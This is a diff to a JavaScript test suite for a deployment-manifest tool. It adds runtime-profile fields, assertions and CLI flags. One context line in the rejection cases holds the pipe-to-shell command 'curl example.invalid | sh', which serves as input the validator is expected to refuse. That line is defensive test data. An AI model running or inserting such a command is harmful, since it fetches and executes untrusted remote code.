@@ -34,6 +34,21 @@ function createInput(overrides = {}) {
     nodeVersion: 'v20.19.0',
     dockerVersion: '28.0.0',
     dockerfileDigest: `sha256:${'d'.repeat(64)}`,
+    runtimeProfile: {
+      id: 'throughput-musl',
+      manifestDigest: `sha256:${'e'.repeat(64)}`,
+      profileDigest: `sha256:${'f'.repeat(64)}`,
+      baseImageFamily: 'musl',
+      targetRuntime: 'linux-musl-x64',
+      singleFile: true,
+      readyToRun: false,
+      tieredPgo: true,
+      quickJitForLoops: true,
+      serverGc: true,
+      nativeAot: false,
+      threadPoolMode: 'runtime-default',
+      topologyMode: 'smt-visible'
+    },
     target: 'final',
     ...overrides
   }
@@ -126,6 +141,8 @@ test('manifest atomically binds commit image digest frontend wasm and toolchain'
   assert.equal(actual.frontendManifestHash, `sha256:${'b'.repeat(64)}`)
   assert.equal(actual.wasmArtifactHash, `sha256:${'c'.repeat(64)}`)
   assert.equal(actual.toolchain.dockerfileDigest, `sha256:${'d'.repeat(64)}`)
+  assert.equal(actual.runtimeProfile.id, 'throughput-musl')
+  assert.equal(actual.runtimeProfile.profileDigest, `sha256:${'f'.repeat(64)}`)
   assert.deepEqual(fs.readdirSync(path.dirname(file)).filter(name => name.includes('.tmp-')), [])
 })
 
@@ -156,6 +173,8 @@ test('manifest rejects mutable tags digest mismatches corruption and sensitive f
     { ...valid, runtimeConfiguration: { AllowedHosts: '*' } },
     { ...valid, createdAtUtc: 'July 11 2026' },
     { ...valid, createdAtUtc: '2026-02-30T01:01:01.000Z' },
+    { ...valid, runtimeProfile: { ...valid.runtimeProfile, profileDigest: 'sha256:abc' } },
+    { ...valid, runtimeProfile: { ...valid.runtimeProfile, baseImageFamily: 'glibc' } },
     { ...valid, toolchain: { ...valid.toolchain, installCommand: 'curl example.invalid | sh' } }
   ]
 
@@ -185,6 +204,19 @@ test('manifest creator CLI writes the same digest-bound schema consumed by deplo
     '--node-version', input.nodeVersion,
     '--docker-version', input.dockerVersion,
     '--dockerfile-digest', input.dockerfileDigest,
+    '--runtime-profile-id', input.runtimeProfile.id,
+    '--runtime-profile-manifest-digest', input.runtimeProfile.manifestDigest,
+    '--runtime-profile-digest', input.runtimeProfile.profileDigest,
+    '--runtime-base-family', input.runtimeProfile.baseImageFamily,
+    '--target-runtime', input.runtimeProfile.targetRuntime,
+    '--publish-single-file', String(input.runtimeProfile.singleFile),
+    '--publish-ready-to-run', String(input.runtimeProfile.readyToRun),
+    '--tiered-pgo', String(input.runtimeProfile.tieredPgo),
+    '--quick-jit-for-loops', String(input.runtimeProfile.quickJitForLoops),
+    '--server-gc', String(input.runtimeProfile.serverGc),
+    '--native-aot', String(input.runtimeProfile.nativeAot),
+    '--thread-pool-mode', input.runtimeProfile.threadPoolMode,
+    '--topology-mode', input.runtimeProfile.topologyMode,
     '--created-at-utc', input.createdAtUtc
   ], { cwd: root, encoding: 'utf8', timeout: 10_000, env: deploymentEnvironment() })
 
